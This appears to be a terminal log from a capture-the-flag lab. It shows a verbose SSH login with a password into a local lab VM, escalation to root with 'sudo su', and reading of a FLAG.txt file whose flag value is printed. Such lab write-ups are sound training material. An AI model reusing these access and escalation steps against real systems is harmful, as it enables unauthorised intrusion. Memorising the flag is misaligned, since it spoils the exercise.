+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: Unspecified GSS failure.  Minor code may provide more information
+No such file or directory
+
+
+debug1: Next authentication method: publickey
+debug1: Trying private key: /root/.ssh/id_rsa
+debug1: Trying private key: /root/.ssh/id_ecdsa
+debug1: Trying private key: /root/.ssh/id_ecdsa_sk
+debug1: Trying private key: /root/.ssh/id_ed25519
+debug1: Trying private key: /root/.ssh/id_ed25519_sk
+debug1: Trying private key: /root/.ssh/id_xmss
+debug1: Trying private key: /root/.ssh/id_dsa
+debug1: Next authentication method: password
+RickSanchez@192.168.56.103's password: 
+Authenticated to 192.168.56.103 ([192.168.56.103]:22222) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts2 for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: hostkeys file /root/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "en_US.UTF-8"
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+debug1: update_known_hosts: known hosts file /root/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+Last login: Fri Oct 27 20:46:02 2023 from 192.168.56.104
+[RickSanchez@localhost ~]$ sudo su
+[sudo] password for RickSanchez: 
+[root@localhost RickSanchez]# ls
+RICKS_SAFE  ThisDoesntContainAnyFlags
+[root@localhost RickSanchez]# cd
+[root@localhost ~]# ls
+anaconda-ks.cfg  FLAG.txt
+[root@localhost ~]# cat FLAG.txt
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+[root@localhost ~]# tail FLAG.txt
+FLAG: {Ionic Defibrillator} - 30 points
+[root@localhost ~]# exit
+exit                                                                                                                                                                                                                                        
+[RickSanchez@localhost ~]$ exitdebug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+
+logout
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.56.103 closed.
+Transferred: sent 3848, received 5636 bytes, in 191.2 seconds
+Bytes per second: sent 20.1, received 29.5
+debug1: Exit status 0
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ 
+      
